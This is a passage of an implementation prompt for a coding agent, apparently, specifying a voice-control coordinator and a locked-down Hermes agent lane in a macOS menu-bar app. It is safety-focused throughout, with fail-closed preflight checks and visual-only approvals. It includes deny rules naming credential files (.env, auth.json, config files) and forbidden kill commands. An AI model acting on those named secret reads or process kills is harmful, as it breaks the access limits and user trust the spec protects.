# WP-HERMES: the coordinator, app wiring, and the Hermes (cloud agent) lane

> Self-contained prompt for an external coding agent. You have NOT seen the conversation that produced this plan.
> Implementer: Cursor agent CLI (strong model). **You run only after WP-LOGIC, WP-UI and WP-PLATFORM are imported** into
> `feat/voice`; your worktree already contains their code. **You are invoked THREE separate times, in order: Part A, then Part B,
> then Part C.** Each invocation starts from a fresh detached worktree at the `feat/voice` HEAD (which contains the earlier parts).
> Do ONLY the part your invocation names, then stop and give the final report; the orchestrator gates, reviews and commits between
> parts. Do not commit.

## 1. Background

desnotch is a macOS menu-bar app (SwiftPM, macOS 13+, library target `DesnotchCore`) with a notch pill UI. We are adding
**voice control**, OFF by default. The user holds a hotkey, speaks, and either a fixed local command runs (volume, media, open
an app, timer) or, if enabled, the request goes to the user's local **Hermes** agent (a Python agent; a cloud model sits behind
it). The design (read it): `docs/voice/PLAN.md`. The contracts: `Sources/DesnotchCore/Voice/Contracts/{VoiceTypes,Protocols,VoiceSessionModel,VoiceStubs}.swift`.
The merged work packages gave you:

- `Voice/Logic/*`: the pure brain. `VoiceReducer.reduce(context, event, env:) -> VoiceTransition`, `IntentRouter`, `ConfirmationPolicy`, `ToolTierTable`, `CommandRiskScanner`, `RateLimiter`.
- `Voice/Platform/*`: `AppleSpeechRecognizer` (+`LevelMeter`), `AppleSpeechSynthesizer`, `CarbonPushToTalk`, `ScreenLockMonitor`, `SystemLocalExecutor`, `VolumeDucker`, `FileAuditLogger`, `DiskFileWriter`, `SystemVoicePermissions`.
- UI: `VoiceSectionView`, wings, status-menu items, Settings section, `VoiceCuePlayer`. They only talk to `VoiceSessionModel`.

**Your job has three parts, in this order, each its own invocation with its own gate (your invocation names which one):**

- **Part A: the coordinator and app wiring.** The `@MainActor` object that owns the reducer's `VoiceContext`, feeds it events (keys, speech, timers, lock, UI actions, agent), interprets its effects with the real platform objects, and publishes the result to `VoiceSessionModel`. After Part A the **local lane works end to end** (hold the key, say "volume thirty", it happens), including a typed debug entry point that needs no microphone. No Hermes yet.
- **Part B: the Hermes lane.** `AgentBackend` over ACP (the Agent Client Protocol: JSON-RPC over the stdin/stdout of `hermes acp`), with a preflight that refuses to run unless the dedicated locked-down `voice` Hermes profile is in place, an own-process-group supervisor with a hard stop, and approval cards.
- **Part C: closing documentation.** `AGENTS.md`, `CHANGELOG.md`, `README.md`.

## 2. Non-negotiable safety properties (they decide every judgement call)

1. **desnotch never creates, edits, or touches anything in `~/.hermes`.** The profile named `voice` is created and locked by the human (`chflags uchg` on its `config.yaml`). Our code only READS it at runtime for the preflight and refuses the Hermes lane until it checks out.
2. **You (the implementer) must never run `hermes`** (not even `--version`), never read `~/.hermes/config.yaml`, `~/.hermes/profiles/**/config.yaml`, `.env`, `auth.json`, or any secret. You MAY read the Hermes Python SOURCE under `~/.hermes/hermes-agent/` (read-only) to learn the ACP shapes and config key names. All your tests use synthetic fixtures and a scripted fake transport.
3. **Nothing is ever approved by voice.** Approvals are visual, bound to a random nonce, and answered `once` or `deny` only; never `session`/`always`.
4. **Default-deny toolset + tripwire.** The reducer already trips on any tool that is not explicitly allowed (R83). You make sure `AgentEvent.toolActivity` is emitted exactly once per tool call, at its START event: Hermes sends a single `tool_call` update (no `status`, the name only in the title prefix) when a tool starts, so the start event itself is the signal (B.5). A mapper that waits for an `in_progress` update would never fire and every tool would run unnoticed.
5. **The stop is total.** Hard stop = interrupt, wait, `killpg(SIGTERM)`, wait, `killpg(SIGKILL)` on the agent's OWN process group, and report survivors. Never `hermes pause`, never `hermes serve --stop`, never `pkill`/`killall hermes`, never touch a process desnotch did not spawn.
6. **Fail closed.** No preflight pass = no Hermes lane. Audit unwritable = no risky actions (section 4.4). Unknown lock state = locked.
7. **No pentest/engagement context on the voice path.** Nothing from Interseptor, vault, engagements, Notion or memory MCPs is ever added to a prompt, and the `mcp_servers` list passed to ACP is always empty.
8. **Privacy.** Transcripts, replies and command text are live content: no logs, no prints, never in the audit log (hashes/codes only).

## 3. Files

You own exactly these. Anything else is off limits.

**Part A new** (`Sources/DesnotchCore/Voice/Coordinator/`): `VoiceCoordinator.swift`, `VoiceTimers.swift`, `DailyTurnCounter.swift`.
**Part A changed**: `Sources/DesnotchCore/App/AppComposition.swift`.
**Part B new** (`Sources/DesnotchCore/Voice/Hermes/`): `HermesLocator.swift`, `MiniConfigScan.swift`, `HermesPreflight.swift`, `ACPTransport.swift`, `ProcessACPTransport.swift`, `ACPClient.swift`, `HermesEventMapper.swift`, `HermesProcessGuard.swift`, `HermesAgentBackend.swift`.
**Part C changed**: `AGENTS.md`, `CHANGELOG.md`, `README.md`.
**Tests** (`Tests/DesnotchCoreTests/Voice/Coordinator/`): `VoiceCoordinatorLocalTests.swift`, `VoiceCoordinatorHermesTests.swift`, `DailyTurnCounterTests.swift`, `VoiceTimersTests.swift`;
(`Tests/DesnotchCoreTests/Voice/Hermes/`): `MiniConfigScanTests.swift`, `HermesPreflightTests.swift`, `ACPClientTests.swift`, `HermesEventMapperTests.swift`, `HermesProcessGuardTests.swift`, `HermesAgentBackendTests.swift`, and `HermesFixtures.swift` (fixtures as Swift string literals: the test target has no resources).

## Part A: the coordinator

**Part A wires ONLY `NullBackend()`.** `HermesAgentBackend` does not exist until Part B, so Part A must build and pass its gate without it. Part B later changes the single backend line in `AppComposition.swift` (same file, same owner).

### A.1 API

```swift
@MainActor
final class VoiceCoordinator {
    init(
        model: VoiceSessionModel, settings: SettingsStore, clock: VoiceClock,
        recognizer: SpeechRecognizing, synthesizer: SpeechSynthesizing, executor: LocalExecuting,
        backend: AgentBackend,                                      // ONE instance, owned by AppComposition (see "Backend identity")
        terminateAgentNow: @escaping @Sendable () -> Void = {},     // synchronous last-resort kill, wired in Part B
        audit: AuditLogging, makeKeys: @escaping @MainActor (VoiceHotkeyChoice) -> PushToTalkSource,
        lock: LockStateProviding, ducker: MediaDucking,
        permissions: VoicePermissionProviding, cues: VoiceCuePlaying,
        timers: VoiceTimerScheduling = RunLoopTimerScheduler(),
        dailyTurns: DailyTurnCounter, isPrivacyMode: @escaping @MainActor () -> Bool,
        makeNonce: @escaping () -> String = { UUID().uuidString }, debugTypingEnabled: Bool
    )
    func start()                      // idempotent; applies the current settings once, then observes them. Does nothing visible unless voiceEnabled.
    func stop()                       // app termination or disable: cancel everything, release hotkeys, restore volume, kill the agent (see below)
    func dispatch(_ event: VoiceEvent)  // internal entry; tests call it directly
    func submitTyped(_ text: String)  // debug only
    private(set) var context: VoiceContext
}
```

**Backend identity (read this twice).** `AppComposition` owns exactly ONE backend object for the app's lifetime and passes that SAME instance to the coordinator: in Part A it is `NullBackend()`; in Part B it is a lazily created stored `HermesAgentBackend` (constructing it spawns nothing). There is **no backend factory**. `submit`, `respond`, `cancelTurn`, `emergencyStop`, `preflight` and `shutdown` always go to that one instance, so a hard stop always reaches the object that owns the child process, and turning the lane off cannot strand a running child. The `voiceHermesLane` setting is NOT a backend switch: it gates `env.hermesLaneReady` (A.2) and the lane check (B.8).
`AgentBackend.shutdown()` is async, but app termination calls `stop()` synchronously and an unawaited `Task` does not run before the process exits, which would orphan `hermes acp`. So `stop()` calls `terminateAgentNow()` directly, a synchronous closure that `AppComposition` wires (Part B) to `HermesAgentBackend.terminateNow()` (B.6); Part A leaves the default `{}`. `AppComposition.stopOwnedResources()` calls `voiceCoordinator?.stop()`.

`VoiceTimerScheduling` and its handle (in `VoiceTimers.swift`), exact:

```swift
@MainActor protocol VoiceTimerHandle: AnyObject { func cancel() }
@MainActor protocol VoiceTimerScheduling { func schedule(after seconds: Double, _ action: @escaping @MainActor () -> Void) -> VoiceTimerHandle }
```

Real: `RunLoopTimerScheduler` (a non-repeating `Timer` on `.common` mode, like `FocusTimerController`'s scheduler; one timer per `(kind, generation)` key; scheduling the same key replaces the old timer). `VoiceTimersTests` defines the test double `CoordManualTimerScheduler` (fire by hand, record schedule/cancel) and uses it; the coordinator tests reuse it. It also tests the real scheduler's replace/cancel semantics with a 10 ms timer and `drainMainQueue`-style waiting.

### A.2 The dispatch loop

`dispatch(event)`: build `VoiceReducerEnv` (below), `let t = VoiceReducer.reduce(context, event, env: env)`, `context = t.context`, **run the effects in order**, then publish: `model.apply(context, reviewDeadline: context.state == .review ? reviewDeadline : nil)`; arm/disarm the Esc key (`keys.setCancelKeyArmed(armed)` where **`armed = context.state != .idle && context.state != .paused`** (Esc does something only in those states: `cancelRequested` is a no-op in `paused` (R132) and in `idle` (R14), and a global key that does nothing must not be stolen from other apps), only when the value changes). Re-entrancy: effects may synchronously cause more events (e.g. a fake executor); queue events and drain them in order instead of recursing (a simple `pending: [VoiceEvent]` + `isDispatching` flag). After each dispatch also run the timer clean-up of A.3.

`VoiceReducerEnv` per call: `now: clock.now()`, `voiceEnabled: voiceEnabledState`, `screenLocked: lock.isLocked`, `hermesLaneReady: laneEnabled && model.hermesLaneStatus == .ready`, `hermesTurnsRemainingToday: dailyTurns.remaining(now: clock.now())`, `speechAllowed: settings.voiceTTSEnabled && !isPrivacyMode()`, `secondFactorAvailable: false`, `freshNonce: makeNonce()`. `voiceEnabledState` and `laneEnabled` are the coordinator's own mirrors of the two settings, updated ONLY from the values the Combine sinks emit (A.5), never by re-reading the setting. `dailyTurns` is stored as a `var` (its `increment(now:)` is mutating).

### A.3 Effect interpreter (exact)

| Effect | What the coordinator does |
|---|---|
| `.startCapture(g, mode)` | remember `captureGeneration = g` and clear the level history. Unless this is a typed flow (A.6): `Task { @MainActor [weak self] ... }` consuming `recognizer.start(localeIdentifier: settings.voiceLocale, contextualStrings: VoiceLexicon.contextualStrings)`, mapping each `SpeechEvent` to `dispatch` with generation `g`: `.captureStarted` -> `.captureStarted(generation: g)` and, if `settings.voiceDuckMedia`, `ducker.duck()`; `.level(x)` -> push into the history and `model.setLevels(LevelMeter.bars(from: history))` (no reducer event); `.partial(s)` -> `.partialTranscript(s, g)`; `.final(s)` -> `.finalTranscript(s, g)`; `.failed(f)` -> `.captureFailed(f, g)`. **A stream that finishes without a final or failed**: if `context.state` is `armed` or `listening` for that generation (or it is the live interrupt capture) dispatch `.captureFailed(.unavailable(.recognizer), generation: g)` (there is no other watchdog for a silently dead recognizer); in `transcribing` the final watchdog (R41) covers it; after a cancel nothing. Drop events whose `g != captureGeneration` (they are stale anyway). |
| `.endCapture(g)` | `recognizer.endAudio()`; `ducker.restore()`. |
| `.cancelCapture(g)` | `recognizer.cancel()`; `ducker.restore()`; clear levels. (Calling `restore()` twice is harmless; the ducker is idempotent. `duck()` must be called at most once per capture: guard with a flag.) While `typedFlow` is set (A.6) neither the recognizer nor the ducker is touched by `.endCapture`/`.cancelCapture`. |
| `.startTimer(kind, g, seconds)` | `timers.schedule(after: seconds) { dispatch(.timerElapsed(kind, generation: g)) }`; remember the handle by `(kind, g)`; when the same key is scheduled again, cancel the replaced handle; for `.review` also set `reviewDeadline = clock.now() + seconds`. **Clean-up rule: after each dispatch, cancel every stored handle whose generation is neither `context.generation` nor `context.interrupt?.generation`.** Do NOT cancel on "any `startCapture` or NEW_ID": R100 starts the stop-only interrupt capture with a new `counter` while the main flow keeps its generation, and the 180 s `.turnBudget` and 60 s `.approval` timers of the running turn must survive it. Cancel all handles on `stop()`. |
| `.cue(c)` | `cues.play(c)` |
| `.execute(intent, g)` | audit gate (A.4), then `Task { let r = await executor.execute(intent); dispatch(.localExecutionFinished(r, generation: g)) }` |
| `.submitToAgent(text, g)` | audit gate (A.4), then `Task { for await e in backend.submit(text) { if case .status("started") = e { dailyTurns.increment(now: clock.now()) }; if case .failed(.preflightRefused(let r)) = e { model.setHermesLaneStatus(.refused(r)) }; dispatch(.agent(e, generation: g)) } }`; if the stream ends without having delivered `.finished` or `.failed`, dispatch `.agent(.failed(.agentFailed("stream_ended")), generation: g)`. With the Part A `NullBackend` this yields the typed `.unavailable(.backend)` failure. |
| `.respondToApproval(nonce, allow)` | `Task { await backend.respond(nonce: nonce, allow: allow) }` |
| `.cancelAgentTurn` | `Task { await backend.cancelTurn() }` |
| `.stopAgentHard` | `Task { let report = await backend.emergencyStop(); model.setSurvivors(report.survivors) }` |
| `.speak(text, g)` | `Task { _ = await synthesizer.speak(text, localeIdentifier: settings.voiceLocale); dispatch(.speechFinished(generation: g)) }` |
| `.stopSpeaking` | `synthesizer.stop()` |
| `.audit(draft)` | `Task { let ok = await audit.append(draft); auditWritable = ok }` (tasks run in order: chain them through one stored `Task`, each awaiting the previous, so records stay ordered) |

### A.4 Audit gate

`auditWritable` starts true. When it is false: an `.execute` effect for an intent whose tier is `>= .t2`, and every `.submitToAgent`, is NOT run; instead dispatch `.localExecutionFinished(.failure(.executionFailed("audit_unwritable")), generation: g)` or `.agent(.failed(.executionFailed("audit_unwritable")), generation: g)`. T0 local commands keep working. (Tier from `ConfirmationPolicy.tier(of:)`.) `FileAuditLogger` default directory/instance is created in `AppComposition`.

### A.5 Inputs

- `keys = makeKeys(settings.voiceHotkey)`; `keys.events` -> `.pressed` => `.talkPressed`; `.released(h)` => `.talkReleased(heldSeconds: h)`; `.cancelKey` => `.cancelRequested`; `.stopKey` => `.stopAllRequested`. Consumed by one `Task` started after `keys.start()`. Always publish the result of `keys.start()` with `model.setHotkeyStatus(...)` (`.unavailable` means another app owns the combination, or the Stop chord ⌥⌘. could not be registered; Settings shows it).
- `lock.changes` (iterated by one `Task` only while voice is enabled; cancelling the task removes the monitor's observers) -> when it becomes true: `.screenLocked`.
- `NSApplication.didBecomeActiveNotification` (observed only while voice is enabled) -> `model.setPermissions(permissions.status())`, so Settings notices a grant made in System Settings.
- **Settings sinks (Combine, `[weak self]`).** `@Published` emits in `willSet`, so inside a sink `settings.voiceEnabled` / `settings.voiceHermesLane` still hold the OLD value. Therefore: (1) every sink is `settings.$voiceEnabled.removeDuplicates().dropFirst().receive(on: DispatchQueue.main).sink { [weak self] value in ... }` (the pattern the existing controllers use; tests call `drainMainQueue()` after flipping a setting), and the handler acts on the EMITTED `value`, storing it in the mirror (`voiceEnabledState`, `laneEnabled`), never re-reading the setting; (2) `start()` first applies the current values of the settings once, synchronously (so a launch with voice already on starts voice), then subscribes (`dropFirst` skips the replayed value). The handlers:
  - `voiceEnabled` true -> `startVoice()`: keys start (publish the status), start the lock watcher and the didBecomeActive observer, `model.setPermissions(permissions.status())`, and if `laneEnabled` run the lane check B.8. `voiceEnabled` false -> `dispatch(.featureDisabled)`, then stop keys, the lock watcher and the recognizer, `ducker.restore()`, and `Task { await backend.shutdown() }`.
  - `voiceHermesLane` on -> `laneEnabled = true`; if `voiceEnabledState`, run the lane check (B.8). Off -> `laneEnabled = false`, `model.setHermesLaneStatus(.off)`; if a Hermes turn is live (`context.lane == .hermes && context.state.isAgentBusy`) `dispatch(.stopAllRequested)` (the hard stop goes to the live backend instance); then `Task { await backend.shutdown() }`.
  - `voiceHotkey` changed -> `keys.stop()`, `keys = makeKeys(newChoice)` (a `CarbonPushToTalk` is single-use), start it, restart the key-consumer `Task`, publish the status again, and re-apply the Esc arm state.
- `model.actions` (installed in `start()`): `stopAll` => `.stopAllRequested`; `resume` => `.resumeRequested`; `approve(n)` => `.approveRequested(nonce: n)`; `deny(n)` => `.denyRequested(nonce: n)`; `cancelReview` => `.cancelRequested`; `toggleTalk` => `.toggleTalk`; `submitTyped` => `submitTyped` (only if `debugTypingEnabled`); `requestPermissions` => `Task { model.setPermissions(await permissions.request()) }`.

### A.6 Typed debug flow (no microphone)

`submitTyped(text)`: only if `debugTypingEnabled` and `context.state == .idle` and `voiceEnabledState`. Set `typedFlow = true`; `dispatch(.talkPressed)`; (the `.startCapture` effect is NOT executed while `typedFlow`, and neither are `.endCapture`/`.cancelCapture` on the recognizer or ducker); then `dispatch(.captureStarted(generation: context.generation))`, `dispatch(.talkReleased(heldSeconds: 1.0))`, `dispatch(.finalTranscript(text, generation: context.generation))`. Clear `typedFlow` after ANY dispatch that leaves the state in `idle`, `error` or `paused`, including a `.talkPressed` that was refused (screen locked: R13 goes to `error`). Everything after the final transcript (review window, execution, approvals, audit) is the real pipeline.

### A.7 Daily cap

`DailyTurnCounter` (struct, `DailyTurnCounterTests`): `init(defaults: UserDefaults, calendar: Calendar = .current, limit: Int = VoiceLimits.hermesTurnsPerDay)`; keys `"voice.hermesTurns.day"` (a `yyyy-MM-dd` string in the calendar's time zone) and `"voice.hermesTurns.count"`; `func remaining(now: Date) -> Int` (the ONLY reader: the env uses `dailyTurns.remaining(now: clock.now())`), `mutating func increment(now: Date)`; a new day resets; a corrupt value counts as 0; never negative. The coordinator calls `increment` when a turn is actually submitted (B.7). These keys are NOT in `SettingsStore` and not exported.

### A.8 `AppComposition` wiring (Part A: `NullBackend` only)

(The only edit to `AppComposition.swift`; keep the existing code as is.) Create the platform objects and the coordinator **only when `!smokeTestMode`**: `voiceCoordinator` (optional property), built with exactly the merged signatures of WP-PLATFORM (read them in the files before you call them): `AppleSpeechRecognizer()`, `AppleSpeechSynthesizer()`, `SystemLocalExecutor(nowPlaying: nowPlayingController, focusTimer: focusTimerController)`, `VolumeDucker()`, `FileAuditLogger(directory: FileAuditLogger.defaultDirectory(), writer: DiskFileWriter(), clock: SystemVoiceClock())`, `makeKeys: { CarbonPushToTalk(choice: $0) }`, `ScreenLockMonitor()`, `SystemVoicePermissions()`, the UI's `VoiceCuePlayer()`, `backend: NullBackend()` (Part B swaps this one line for the stored `HermesAgentBackend`), `dailyTurns: DailyTurnCounter(defaults: .standard)`, `isPrivacyMode: { SettingsStore.shared.privacyModeEnabled }`, `debugTypingEnabled: ProcessInfo.processInfo.environment["DESNOTCH_VOICE_DEBUG"] == "1"`. These initializers are specified to be side-effect free (no audio engine, no observers, no directories); if you find one that is not, build it lazily inside a closure instead of eagerly and report it. Create the coordinator at the end of `init` (after every other property is initialized) and call `start()` right there (it is inert unless `voiceEnabled`); you may NOT edit `AppDelegate.swift`. Call `voiceCoordinator?.stop()` in `stopOwnedResources()`. With `voiceEnabled == false` the coordinator must register NO hotkey, create NO audio engine and run NO timers (verify with a test).

### A.9 Part A tests (`VoiceCoordinatorLocalTests`, using the contract's doubles)

**Test doubles.** All test files share one module, so a double named like another package's double breaks the merged build. Define every coordinator double INSIDE `VoiceCoordinatorLocalTests.swift` (the timer scheduler inside `VoiceTimersTests.swift`), as internal `final class`es (not `private`, `VoiceCoordinatorHermesTests` reuses them), all prefixed `Coord`: `CoordFakeKeys` (a `PushToTalkSource` with injectable `events`, a `startCount`, `stopCount` and the history of `setCancelKeyArmed` values), `CoordFakeLock` (a `LockStateProviding` with a controllable `isLocked` and `changes`), `CoordRecordingDucker` (duck/restore counters), `CoordRecordingSynth`, `CoordRecordingAudit` (records drafts; has a failing mode), `CoordFakePermissions`, `CoordManualTimerScheduler`. Before you name a type run `rg -n "class <Name>|struct <Name>" Tests` and change the name on a collision. Use the contract's `RecordingExecutor`, `ScriptedRecognizer`, `ScriptedBackend`, `FakeVoiceClock`, `InMemoryFileWriter` from `VoiceTestSupport.swift` as they are.

Names (each is a test): `testTypedVolumeCommandRunsThroughReviewAndExecutes`, `testHoldFlowWithScriptedRecognizer` (press, scripted `.captureStarted/.partial/.final`, release), `testReviewWindowCancelByEscapeNeverExecutes`, `testStopKeyAlwaysStopsAndReturnsIdle`, `testLockedScreenRefusesToStart`, `testScreenLockedWhileListeningCancelsCapture`, `testFeatureDisabledStopsCaptureAndReleasesKeys`, `testCancelKeyIsArmedOnlyWhileActive`, `testCancelKeyIsDisarmedInIdleAndPaused`, `testDuckingIsBalanced` (one duck, one restore per capture, also on cancel), `testT2VolumeNeedsApprovalAndWrongNonceDoesNothing`, `testApproveExecutesAndDenyDoesNot`, `testAuditUnwritableRefusesT2ButNotT0`, `testRepliesAreSpokenOnlyWhenAllowed` (TTS setting, privacy mode), `testNoCloudSubmitWithoutUserRelease`, `testDailyCapRefusesTheTurn`, `testDisabledVoiceStartsNothing` (no `keys.start`, no recognizer start, no timers), `testModelActionsDispatchEvents`, `testStaleTimerFromOldFlowIsIgnored`, `testInterruptCaptureDoesNotCancelTurnBudgetOrApprovalTimers`, `testSettingsFlipOnARealSettingsStoreStartsAndStopsVoice` (a real `SettingsStore(defaults:)` on a UUID suite; flip `voiceEnabled`, `drainMainQueue()`, assert `keys.start` once; flip back, assert released), `testSilentRecognizerStreamEndFailsTheCaptureInsteadOfHanging`, `testNoAuditRecordContainsTheTranscript` (scan every appended draft/record for the spoken text except the `transcript` field handed to the logger, which `FileAuditLogger` hashes). `DailyTurnCounterTests`: remaining/increment/new day/corrupt/limit.

**Part A gate (P2).** Build clean; the new tests and the whole suite green; `git status` only in your files. Then **stop**: Part A ends here and the orchestrator gates, reviews and commits it before Part B is started. Then a **manual check on the Mac mini** (it launches the app, so it needs the installed `/Applications/desnotch.app` to be quit by the human first; if it is running, report these items as `NOT RUN: installed desnotch is running` and hand the exact steps to the human; report each item you do run as DONE/NOT DONE and what you saw):

1. `swift build` then `DESNOTCH_VOICE_DEBUG=1 swift run` (or the packaged app), enable "Voice control" in Settings (this prompts for Microphone/Speech: allow, or skip: the typed path does not need them), use the status menu "Type a Voice Command…": `volume thirty`, `mute`, `unmute`, `play`, `pause`, `timer one minute`, `open safari`, `volume ninety` (a card must appear; Deny it; again and Approve it), `cancel` (ambiguous), `abort agent`. Each must behave per the tables in `docs/voice/PLAN.md`; the review banner shows for 1.5 s; Esc is not captured at idle.
2. `~/Library/Application Support/desnotch/voice/voice-audit.jsonl` exists with mode 0600, contains no spoken text, and `python3 -I scripts/voice-harness/verify-audit.py "$HOME/Library/Application Support/desnotch/voice/voice-audit.jsonl"` prints `ok`.
3. With Voice control OFF: no new process threads for audio, no hotkey registered (try ⌥⌘V in another app), idle CPU unchanged.

## Part B: the Hermes lane

(Part B starts from a fresh worktree that already contains the committed Part A.)

### B.1 What you may read (read-only) to learn the shapes

Under `~/.hermes/hermes-agent/` ONLY Python source: `acp_adapter/entry.py`, `server.py` (methods `initialize`, `new_session(cwd, mcp_servers)`, `prompt`, `cancel`), `permissions.py` (the permission option ids are exactly `allow_once`, `allow_session`, `allow_always`, `deny`, `deny_always`), `events.py`, `tools.py`, `session.py`; the `acp` Python package's `schema.py` (find it with `find ~/.hermes/hermes-agent -path '*site-packages/acp/schema.py'`); `hermes_cli/` profile code and `tools/approval*.py`. The facts you need are already verified and listed below with their source lines; record them in a code comment at the top of `HermesPreflight.swift` as `file:line` (re-check the lines; they can drift). If you cannot confirm a fact, implement the preflight to REFUSE and say so in your report.

### B.2 Transport

`ACPTransport` (`ACPTransport.swift`): a `Sendable` protocol: `func start() throws`, `func send(line: Data) throws`, `var lines: AsyncStream<Data>`, `func terminate()`. Newline-delimited JSON-RPC 2.0 (reuse `AdapterLineBuffer`). `ProcessACPTransport` spawns `/usr/bin/perl -MPOSIX=setsid -e 'setsid(); exec {$ARGV[0]} @ARGV; exit 127' <hermesPath> -p voice acp` (the same fixed launcher `SubprocessRunner` uses, so the child leads its own session and process group, `pgid == pid`), environment `SubprocessRunner.sanitizedEnvironment()` (keeps `HOME`), stdin/stdout pipes, stderr to `FileHandle.nullDevice`, working directory = a fresh empty temp directory (`FileManager.default.temporaryDirectory/desnotch-voice-<uuid>`, removed on shutdown). All pipe callbacks run on one serial queue and carry a generation (copy the `MediaRemoteBridge` pattern: stale callbacks from a dead process must not touch the new stream).
**Test injection.** The command is injectable: `struct ACPLaunch: Sendable { var perl: URL; var arguments: [String] }` with `static func hermes(path: URL) -> ACPLaunch` as the production value, and `ProcessACPTransport.init(launch: ACPLaunch, workingDirectoryRoot: URL)`; `HermesProcessGuard` takes the same `ACPLaunch` and a `pidFileDirectory: URL` (production: `~/Library/Application Support/desnotch/voice`; tests: a UUID temp directory). The real-process tests (B.6) point it at `/bin/sh -c '...'` through the same perl launcher.

### B.3 Preflight (`HermesLocator`, `MiniConfigScan`, `HermesPreflight`)

Declare exactly these (they are yours, nobody else defines them):

```swift
protocol ConfigReading: Sendable { func read() -> String? }        // text of the voice profile's config.yaml; nil if absent or unreadable
protocol FileFlagReading: Sendable { func flags() -> UInt32? }     // st_flags of that file; nil if it cannot be stat'ed
enum ScanValue: Equatable { case string(String), list([ScanValue]), map([String: ScanValue]) }
enum MiniConfigScanError: Error, Equatable { case unsupported }
struct MiniConfigScan { init(parsing text: String) throws; func value(at path: [String]) -> ScanValue? }
enum HermesACP { static let supportedProtocolVersions: Set<Int> = [1] }       // in ACPClient.swift; acp/meta.py PROTOCOL_VERSION = 1
enum HermesToolsetPolicy { static let allowedToolsets: Set<String> = [] }     // in HermesPreflight.swift; EMPTY: the profile declares no toolsets
struct HermesLocator { init(candidates: [URL] = default, isExecutable: @Sendable (URL) -> Bool = default); func hermesURL() -> URL?; static func voiceProfileConfigURL() -> URL }
enum HermesPreflight {
    static func run(locator: HermesLocator, configReader: ConfigReading, fileFlags: FileFlagReading) -> AgentPreflightResult
    static func checkProtocol(_ version: Int) -> AgentPreflightResult?   // nil = fine; .refused(.protocolMismatch) otherwise; P8, called by ACPClient after `initialize`
}
```

Real readers: `VoiceProfileConfigReader: ConfigReading` reads `HermesLocator.voiceProfileConfigURL()` = `NSHomeDirectory()/.hermes/profiles/voice/config.yaml` (profile layout: `hermes_cli/profiles.py:287-290,442`); `VoiceProfileFlagReader: FileFlagReading` does `stat` on the same path and returns `st_flags`. `HermesLocator.hermesURL()`: first executable among `NSHomeDirectory()/.local/bin/hermes`, `/opt/homebrew/bin/hermes`, `/usr/local/bin/hermes`. `run` has NO `protocolVersion:` parameter (P8 is live inside `ACPClient`). Checks, in order; the first failure is returned:

| # | Check | Failure |
|---|---|---|
| P1 | `hermesURL()` is non-nil | `.binaryMissing` |
| P2 | `configReader.read()` returns text | `.profileMissing` |
| P3 | `MiniConfigScan(parsing:)` succeeds (a throw means "cannot prove approvals are on") and `approvals.mode` is PRESENT, a string, and lowercased is `manual` or `smart`. A missing key refuses | `.approvalsOff` |
| P4 | `command_allowlist` (a TOP-LEVEL key, not under `approvals`; `tools/approval.py:399-414`): absent OR an empty list passes; any other value (non-empty list, a string, a map) refuses | `.allowlistNotEmpty` |
| P5 | `mcp_servers` (top-level): absent or an empty map/list passes; anything else refuses | `.mcpConfigured` |
| P6 | `platform_toolsets.acp` must be PRESENT as a list (`acp_adapter/session.py:518`; an empty list means no toolsets, `tools_config.py` `_get_platform_tools`); every entry is in `HermesToolsetPolicy.allowedToolsets`. Missing or not a list refuses | `.toolsetOutsideAllowlist` |
| P7 | `fileFlags.flags()` is non-nil and `flags & UInt32(UF_IMMUTABLE) != 0` (`chflags uchg`); nil refuses | `.configNotLocked` |
| P8 | (live, `HermesPreflight.checkProtocol`, called by `ACPClient` after `initialize`) the reported protocol version is in `HermesACP.supportedProtocolVersions` | `.protocolMismatch` |

`MiniConfigScan` is a tiny YAML-subset reader (no dependency): `key: value` scalars, nested maps by consistent two-space-multiple indentation, block lists (`- x`), flow `[]`/`{}` on one line, `#` comments, single/double quoted scalars. It indexes the TOP-LEVEL keys (column 0) and interprets ONLY the four sections the preflight reads (`approvals`, `command_allowlist`, `mcp_servers`, `platform_toolsets`); every other top-level section of a real Hermes config (model, display, long folded strings, lists of maps...) is skipped line by line without being interpreted, up to the next column-0 key. Inside the four sections anything unsupported (anchors/aliases/merge keys `&x *x <<:`, block scalars `|` `>`, tabs, lists of maps) throws `.unsupported`; a tab or a second document marker (`---` after the first line, `...`) ANYWHERE throws; **a duplicate key in the four sections (or a duplicate top-level key of one of them) throws `.unsupported`** (PyYAML keeps the LAST duplicate, so a first-wins scanner would read `mode: manual` while Hermes uses `mode: off`). Run the preflight on EVERY process spawn and EVERY new ACP session, never cached, and refresh `model.hermesLaneStatus` (`.checking` -> `.ready` or `.refused(reason)`).

**Golden passing config** (`HermesFixtures.goldenConfig`; the human can create the profile from this; every other key is allowed and skipped):

```yaml
approvals:
  mode: manual
command_allowlist: []
mcp_servers: {}
platform_toolsets:
  acp: []
```

`HermesFixtures` also holds a "realistic" config for the skip test: the golden four sections plus an unrelated `model:` map, a folded string (`>`) under `display:`, and a list of maps under `skills:`; it must still pass.

### B.4 ACP client (`ACPClient`)

Lenient decoding (`JSONSerialization` into dictionaries; unknown fields ignored; a malformed line is dropped). It speaks only: `initialize` (declare NO client capabilities: no file system, no terminal; check the reported `protocolVersion` with `HermesPreflight.checkProtocol`), `session/new` (`cwd` = the temp dir, `mcpServers: []`), `session/prompt` (one text content block, the utterance), `session/cancel`, and answers `session/request_permission`. Notifications `session/update` carry the updates. Any other agent->client REQUEST is answered with JSON-RPC error `-32601` (method not found). Request ids are monotonically increasing integers; responses are matched by id; a timeout of 20 s on `initialize`/`session/new` and none on the streaming `prompt`.

### B.5 Event mapping (`HermesEventMapper`)

The mapper holds no clock: every entry point takes the time (`at: Date`), so coalescing is tested without sleeping. **Wire shapes (verified in the Hermes source: `acp_adapter/events.py` `make_tool_progress_cb` sends `build_tool_start(...)` when a tool starts; `tools.py:793-815` builds it with `acp.start_tool_call(..., status=None)`; `permissions.py:55-63` builds the permission tool call with `raw_input={"command":..., "description":...}`). Write the mapper tests against these literal payloads:**

```json
{"jsonrpc":"2.0","method":"session/update","params":{"sessionId":"s1","update":{"sessionUpdate":"agent_message_chunk","content":{"type":"text","text":"It is "}}}}
{"jsonrpc":"2.0","method":"session/update","params":{"sessionId":"s1","update":{"sessionUpdate":"tool_call","toolCallId":"tc1","title":"terminal: ls -la","kind":"execute"}}}
{"jsonrpc":"2.0","method":"session/update","params":{"sessionId":"s1","update":{"sessionUpdate":"tool_call_update","toolCallId":"tc1","status":"completed"}}}
